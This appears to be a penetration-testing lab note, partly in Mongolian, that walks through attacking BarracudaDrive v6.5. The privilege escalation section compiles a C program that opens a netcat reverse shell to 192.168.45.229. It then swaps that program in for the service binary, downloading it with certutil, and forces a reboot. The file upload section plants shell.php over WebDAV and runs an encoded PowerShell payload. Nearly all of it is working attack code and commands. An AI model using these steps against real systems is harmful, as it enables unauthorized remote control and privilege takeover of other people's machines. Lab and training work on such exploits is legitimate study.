# BarracudaDrive v6.5 - Privilege Escalation & File Upload

Reference: https://www.exploit-db.com/exploits/48789

## Privilege Escalation

**1-р алхам: Хортой кодоо бэлдэх (Kali дээр)**

```c
cat << EOF > addAdmin.c
#include <windows.h>
#include <stdlib.h>

int main(void) {
    system("C:\\xampp\\htdocs\\nc.exe 192.168.45.229 8000 -e cmd.exe");
    WinExec("C:\\bd\\bd.service.exe", 0);
    return 0;
}
EOF
```

**2-р алхам: Кодоо EXE болгох (Kali дээр)**

```bash
i686-w64-mingw32-gcc addAdmin.c -o bd.exe
```

**3-р алхам: Файлуудаа солих (Windows дээр)**

```powershell
PS C:\bd> move bd.exe bd.service.exe
PS C:\bd> certutil.exe -urlcache -split -f http://192.168.45.229/bd.exe bd.exe
```

**Идэвхжүүлэх (Reboot):**

```cmd
shutdown /r /t 0
```

[image]

## cadaver File Upload

1. Set administrator user as `zetr0` for BarracudaDrive 6.5

2. Upload reverse shell to webserver:

```bash
cadaver http://192.168.199.127:8000/fs/
# Username: zetr0
# Password: SNIP

dav:/fs/c/xampp/htdocs/> put shell.php
```

Execute via:

```
http://192.168.199.127:45332/shell.php?cmd=powershell -enc <BASE64_PAYLOAD>
```
